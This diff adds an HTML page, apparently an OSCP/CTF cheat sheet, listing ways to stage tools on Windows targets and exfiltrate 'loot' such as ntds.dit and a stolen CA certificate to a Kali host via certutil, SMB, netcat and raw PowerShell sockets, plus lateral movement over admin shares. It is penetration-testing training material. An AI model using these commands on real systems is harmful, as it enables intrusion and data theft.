@@ -1,0 +1,251 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>File Transfer Cheatsheet</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+/*
+  Layout: a flat reference list grouped by direction (Kali→Win, Win→Kali,
+  Win→Win), each method as a terminal-style command card. Two accent
+  threads mark direction — teal for outbound from attack box, amber for
+  inbound to it — so the eye can sort "which way is this" at a glance.
+*/
+:root{
+  --bg:#f6f4ef; --surface:#ffffff; --surface-2:#eeebe1;
+  --fg:#1c1b19; --muted:#6b675f; --border:#ddd8cb;
+  --code-bg:#1c1b19; --code-fg:#e8e4d9;
+  --out:#1b7a6b; --out-soft:#dcf0ec;
+  --in:#9a6a00; --in-soft:#f4e6c4;
+  --p2p:#5a4a8f; --p2p-soft:#e8e3f5;
+  color-scheme:light;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#0e0d0b; --surface:#17150f; --surface-2:#1f1c14;
+    --fg:#eee9da; --muted:#a39d8c; --border:#332f22;
+    --code-bg:#0a0906; --code-fg:#e4dfcd;
+    --out:#5fcbb8; --out-soft:#123330;
+    --in:#e0ac3f; --in-soft:#3a2d12;
+    --p2p:#b3a3e0; --p2p-soft:#2a2440;
+    color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0e0d0b; --surface:#17150f; --surface-2:#1f1c14;
+  --fg:#eee9da; --muted:#a39d8c; --border:#332f22;
+  --code-bg:#0a0906; --code-fg:#e4dfcd;
+  --out:#5fcbb8; --out-soft:#123330;
+  --in:#e0ac3f; --in-soft:#3a2d12;
+  --p2p:#b3a3e0; --p2p-soft:#2a2440;
+  color-scheme:dark;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg); color:var(--fg);
+  font-family:"IBM Plex Sans",-apple-system,Segoe UI,Arial,sans-serif;
+  line-height:1.55;
+  padding-left:max(16px, env(safe-area-inset-left,0px));
+  padding-right:max(16px, env(safe-area-inset-right,0px));
+}
+h1,h2,h3{font-family:"JetBrains Mono",ui-monospace,monospace; font-weight:700; text-wrap:balance; margin:0;}
+code,pre{font-family:"JetBrains Mono",ui-monospace,monospace;}
+.wrap{max-width:860px; margin:0 auto; padding-block:36px;}
+
+.hero{padding:24px; border:1px solid var(--border); border-radius:10px; background:var(--surface); margin-bottom:26px;}
+.hero .eyebrow{font-family:"JetBrains Mono",monospace; font-size:.7rem; letter-spacing:.14em; text-transform:uppercase; color:var(--muted); margin-bottom:8px;}
+.hero h1{font-size:clamp(1.3rem,4.5vw,1.8rem); line-height:1.2;}
+.hero p{color:var(--muted); margin:10px 0 0 0; max-width:62ch;}
+
+.legend{display:flex; gap:10px; flex-wrap:wrap; margin-bottom:28px;}
+.legend span{
+  display:inline-flex; align-items:center; gap:6px;
+  font-size:.78rem; font-family:"JetBrains Mono",monospace;
+  padding:5px 10px; border-radius:999px; border:1px solid var(--border);
+}
+.legend .dot{width:9px;height:9px;border-radius:50%;}
+
+section{margin-bottom:34px;}
+.sec-head{display:flex; align-items:center; gap:10px; padding-bottom:8px; border-bottom:2px solid var(--border); margin-bottom:16px;}
+.sec-head h2{font-size:1.15rem;}
+.badge{font-size:.68rem; font-family:"JetBrains Mono",monospace; padding:3px 9px; border-radius:999px; letter-spacing:.05em;}
+.out .sec-head{border-bottom-color:var(--out);} .out .badge{background:var(--out-soft); color:var(--out);}
+.in .sec-head{border-bottom-color:var(--in);} .in .badge{background:var(--in-soft); color:var(--in);}
+.p2p .sec-head{border-bottom-color:var(--p2p);} .p2p .badge{background:var(--p2p-soft); color:var(--p2p);}
+
+.method{border:1px solid var(--border); border-radius:10px; background:var(--surface); padding:14px 16px; margin-bottom:12px;}
+.method h3{font-size:.92rem; margin-bottom:8px; display:flex; align-items:center; gap:8px;}
+.method h3 small{font-weight:400; color:var(--muted); font-size:.78rem;}
+pre.cmd{
+  background:var(--code-bg); color:var(--code-fg); border-radius:7px;
+  padding:11px 13px; overflow-x:auto; font-size:.8rem; line-height:1.5;
+  margin:0 0 6px 0; white-space:pre-wrap; word-break:break-word;
+}
+pre.cmd:last-of-type{margin-bottom:0;}
+pre.cmd .lbl{color:#8f8a76; display:block; font-size:.72rem; margin-bottom:2px;}
+.note{font-size:.82rem; color:var(--muted); margin-top:6px;}
+.note code{background:var(--surface-2); padding:1px 5px; border-radius:4px; font-size:.9em;}
+
+footer{margin-top:30px; padding-top:16px; border-top:1px solid var(--border); color:var(--muted); font-size:.8rem;}
+</style>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+
+<div class="wrap">
+  <div class="hero">
+    <span class="eyebrow">OSCP / CTF Reference</span>
+    <h1>File Transfer Cheatsheet — Kali ⇄ Windows</h1>
+    <p>Every practical way to move files between a Kali attack box and a Windows target, both directions, plus Windows-to-Windows for lateral movement. Pick based on what's open: HTTP out, SMB, PowerShell, or a raw port if nothing else works.</p>
+  </div>
+
+  <div class="legend">
+    <span><span class="dot" style="background:var(--out)"></span>Kali → Windows</span>
+    <span><span class="dot" style="background:var(--in)"></span>Windows → Kali</span>
+    <span><span class="dot" style="background:var(--p2p)"></span>Windows → Windows</span>
+  </div>
+
+  <!-- ============ KALI -> WINDOWS ============ -->
+  <section class="out">
+    <div class="sec-head"><span class="badge">OUT</span><h2>Kali → Windows (push a file to the target)</h2></div>
+
+    <div class="method">
+      <h3>1. Python HTTP server + PowerShell download <small>(most reliable, no extra tools)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali — serve the file</span>python3 -m http.server 8000</pre>
+      <pre class="cmd"><span class="lbl">Windows — download it (PowerShell)</span>iwr -uri http://&lt;kali-ip&gt;:8000/file.exe -outfile file.exe
+<span class="lbl">older PS / more compatible</span>powershell -c "(New-Object Net.WebClient).DownloadFile('http://&lt;kali-ip&gt;:8000/file.exe','C:\Users\Public\file.exe')"</pre>
+      <p class="note">Works on every modern Windows with PowerShell. <code>certutil</code> below is the fallback if PowerShell is blocked by AppLocker/CLM.</p>
+    </div>
+
+    <div class="method">
+      <h3>2. certutil <small>(lives off the land — no PowerShell needed)</small></h3>
+      <pre class="cmd"><span class="lbl">Windows cmd.exe</span>certutil.exe -urlcache -split -f http://&lt;kali-ip&gt;:8000/file.exe file.exe</pre>
+      <p class="note">Often whitelisted by AV/EDR since it's a signed Microsoft binary — a classic LOLBin. <code>-split</code> downloads in chunks, <code>-f</code> forces overwrite.</p>
+    </div>
+
+    <div class="method">
+      <h3>3. SMB share <small>(impacket-smbserver)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali — spin up an anonymous SMB share of the current dir</span>impacket-smbserver share . -smb2support</pre>
+      <pre class="cmd"><span class="lbl">Windows — copy from it</span>copy \\&lt;kali-ip&gt;\share\file.exe C:\Users\Public\file.exe</pre>
+      <p class="note">No credentials needed. Good when outbound HTTP is firewalled but SMB (445) isn't. Add <code>-username/-password</code> to impacket-smbserver if the target insists on auth.</p>
+    </div>
+
+    <div class="method">
+      <h3>4. FTP <small>(python pyftpdlib)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali</span>python3 -m pyftpdlib -p 21 -w</pre>
+      <pre class="cmd"><span class="lbl">Windows cmd.exe</span>echo open &lt;kali-ip&gt; 21 > ftp.txt
+echo anonymous >> ftp.txt
+echo anonymous >> ftp.txt
+echo binary >> ftp.txt
+echo get file.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt</pre>
+      <p class="note"><code>-w</code> allows writes too, handy if you also need Windows → Kali through the same server.</p>
+    </div>
+
+    <div class="method">
+      <h3>5. SCP / SSH <small>(when Windows has OpenSSH client/server, e.g. Win10+)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali → push to Windows (Windows must run sshd)</span>scp file.exe administrator@&lt;win-ip&gt;:C:\\Users\\Public\\file.exe</pre>
+      <p class="note">Needs Windows OpenSSH Server feature enabled and reachable creds — not always available, but clean when it is (as used for THMDC in the certificate-persistence steps above).</p>
+    </div>
+
+    <div class="method">
+      <h3>6. Base64 paste <small>(no network path at all — through an existing shell)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali — encode</span>base64 -w0 file.exe > file.b64</pre>
+      <pre class="cmd"><span class="lbl">Windows PowerShell — decode (paste the base64 string in)</span>[IO.File]::WriteAllBytes("file.exe",[Convert]::FromBase64String("&lt;paste b64 here&gt;"))</pre>
+      <p class="note">Last resort for small files only — clipboard/RDP paste or copy-paste through a web shell when no listener/port is reachable either way.</p>
+    </div>
+  </section>
+
+  <!-- ============ WINDOWS -> KALI ============ -->
+  <section class="in">
+    <div class="sec-head"><span class="badge">IN</span><h2>Windows → Kali (pull loot off the target)</h2></div>
+
+    <div class="method">
+      <h3>1. PowerShell upload to a listening HTTP server</h3>
+      <pre class="cmd"><span class="lbl">Kali — simplest receiver (uploadserver module)</span>pip install uploadserver --break-system-packages
+python3 -m uploadserver 8000</pre>
+      <pre class="cmd"><span class="lbl">Windows PowerShell — POST the file up</span>iwr -Uri http://&lt;kali-ip&gt;:8000/upload -Method POST -InFile loot.zip -ContentType "multipart/form-data"</pre>
+      <p class="note">If <code>uploadserver</code> isn't installed, use the SMB method below instead — it needs zero setup on Kali beyond impacket.</p>
+    </div>
+
+    <div class="method">
+      <h3>2. SMB share with write enabled <small>(easiest two-way option)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali — start the share, require a login</span>impacket-smbserver share . -smb2support -username a -password a</pre>
+      <pre class="cmd"><span class="lbl">Windows — authenticate first, THEN copy</span>net use \\&lt;kali-ip&gt;\share /user:a a
+copy C:\loot\ntds.dit \\&lt;kali-ip&gt;\share\ntds.dit</pre>
+      <p class="note">
+        <strong>Which username/password go where:</strong> <code>-username a -password a</code> on the Kali side just means "any client must log in as user <code>a</code>, password <code>a</code> to use this share" — these are <em>not</em> real Windows or domain credentials, impacket invents and accepts them itself. On the Windows side, <code>net use \\&lt;ip&gt;\share /user:a a</code> must supply the <strong>exact same</strong> username/password you picked on Kali (here, <code>a</code> / <code>a</code>) — think of it as a throwaway login just for this one transfer, unrelated to any domain account.
+      </p>
+      <p class="note">Drop <code>-username</code>/<code>-password</code> entirely from the Kali command for a fully anonymous share — then skip <code>net use</code> too and just <code>copy</code> straight to <code>\\&lt;kali-ip&gt;\share\...</code>. This is exactly the pattern used earlier for grabbing <code>za-THMDC-CA.pfx</code> off a DC and pulling it back to the attack box.</p>
+    </div>
+
+    <div class="method">
+      <h3>3a. SCP — run <em>from Windows</em>, push to Kali</h3>
+      <pre class="cmd"><span class="lbl">Kali — make sure sshd is running (usually already is)</span>sudo systemctl start ssh</pre>
+      <pre class="cmd"><span class="lbl">Windows PowerShell or cmd.exe — push the file to Kali</span>scp C:\loot\ntds.dit kali@&lt;kali-ip&gt;:/home/kali/loot/</pre>
+      <p class="note">
+        <strong>Username/password here:</strong> <code>kali@&lt;kali-ip&gt;</code> is a <strong>real login on the Kali box</strong> — use whatever Linux user account actually exists there (commonly <code>kali</code>, or <code>root</code> if SSH root login is enabled), and when prompted, type <strong>that Linux user's real password</strong>.
+      </p>
+      <p class="note">Needs Windows 10 1809+/Server 2019+ (OpenSSH client built in) and Kali's SSH port (22) reachable from the target.</p>
+    </div>
+
+    <div class="method">
+      <h3>3b. SCP — run <em>from Kali</em>, pull from Windows <small>(target must run an SSH server)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali — connect out to Windows' sshd and pull the file in</span>scp administrator@10.200.x.101:"C:\Users\Administrator.ZA\mandy\za-THMDC-CA.pfx" .</pre>
+      <p class="note">
+        <strong>Username/password here:</strong> <code>administrator</code> must be a <strong>real Windows account</strong> on the target (<code>10.200.x.101</code>), and the password prompt wants <strong>that Windows account's real password</strong> — this is the exact command used earlier to pull <code>za-THMDC-CA.pfx</code> off THMDC after exporting the CA cert with mimikatz.
+      </p>
+      <p class="note">
+        The file path after the colon is the <strong>Windows</strong> path to the file, in quotes (because of the spaces/backslashes) — <code>C:\Users\Administrator.ZA\mandy\za-THMDC-CA.pfx</code>. The trailing <code>.</code> means "save it into my current directory on Kali."
+      </p>
+      <p class="note">Only works if the target is running <strong>OpenSSH Server</strong> (not just the client) — common on lab DCs/servers set up for SSH management, but not a Windows default. If sshd isn't running on the target, fall back to the SMB or HTTP-pull methods instead.</p>
+    </div>
+
+    <div class="method">
+      <h3>4. Netcat <small>(when nothing else is reachable but a raw port is)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali — listener, redirect stdout to a file</span>nc -lvnp 4444 > loot.zip</pre>
+      <pre class="cmd"><span class="lbl">Windows — send the file (nc.exe, or ncat)</span>nc.exe &lt;kali-ip&gt; 4444 < loot.zip</pre>
+      <p class="note">No PowerShell's netcat equivalent built in — need <code>nc.exe</code>/<code>ncat.exe</code> staged on the box first, or use the PowerShell TCP client snippet below.</p>
+    </div>
+
+    <div class="method">
+      <h3>5. Raw TCP via PowerShell <small>(zero extra binaries)</small></h3>
+      <pre class="cmd"><span class="lbl">Kali</span>nc -lvnp 4444 > loot.zip</pre>
+      <pre class="cmd"><span class="lbl">Windows PowerShell</span>$c = New-Object System.Net.Sockets.TCPClient("&lt;kali-ip&gt;",4444)
+$s = $c.GetStream()
+$b = [IO.File]::ReadAllBytes("loot.zip")
+$s.Write($b,0,$b.Length)
+$s.Close(); $c.Close()</pre>
+      <p class="note">Pure PowerShell, nothing to upload to the target first — good for AV-restricted environments.</p>
+    </div>
+
+    <div class="method">
+      <h3>6. Base64 exfil through an existing shell</h3>
+      <pre class="cmd"><span class="lbl">Windows PowerShell — print base64 to console</span>[Convert]::ToBase64String([IO.File]::ReadAllBytes("secret.txt"))</pre>
+      <pre class="cmd"><span class="lbl">Kali — paste it back and decode</span>echo "&lt;paste b64 here&gt;" | base64 -d > secret.txt</pre>
+      <p class="note">Only for small text-ish files — console/RDP copy-paste is the transport, no network needed at all.</p>
+    </div>
+  </section>
+
+  <!-- ============ WINDOWS -> WINDOWS ============ -->
+  <section class="p2p">
+    <div class="sec-head"><span class="badge">LATERAL</span><h2>Windows → Windows (lateral movement)</h2></div>
+
+    <div class="method">
+      <h3>1. Admin share (<code>C$</code> / <code>ADMIN$</code>)</h3>
+      <pre class="cmd"><span class="lbl">From a box with domain admin / local admin creds on the target</span>copy file.exe \\&lt;target-ip&gt;\C$\Windows\Temp\file.exe
+<span class="lbl">or, authenticating explicitly first</span>net use \\&lt;target-ip&gt;\C$ /user:DOMAIN\administrator Password123
+copy file.exe \\&lt;target-ip&gt;\C$\Windows\Temp\file.exe</pre>
+      <p class="note">Exactly the mechanism golden/silver tickets abuse — once a ticket is cached (<code>klist</code> shows it), <code>copy</code>/<code>dir</code> against <code>\\host\c$</code> just works.</p>
+    </div>
+
+    <div class="method">
+      <h3>2. PowerShell remoting (WinRM)</h3>
+      <pre class="cmd"><span class="lbl">Push a file over an existing PS session</span>$s = New-PSSession -ComputerName target -Credential $cred
+Copy-Item -ToSession $s -Path .\file.exe -Destination C:\Windows\Temp\file.exe</pre>
+      <p class="note">Needs WinRM (5985/5986) reachable and creds/ticket valid for that host.</p>
+    </div>
+  </section>
+
+  <footer>
+    Quick picks: <strong>HTTP (certutil/iwr)</strong> when outbound web is open · <strong>SMB (impacket-smbserver)</strong> when it isn't but 445 is · <strong>raw TCP/netcat</strong> as the last resort when only one arbitrary port is reachable.
+  </footer>
+</div>
+
+</body></html>
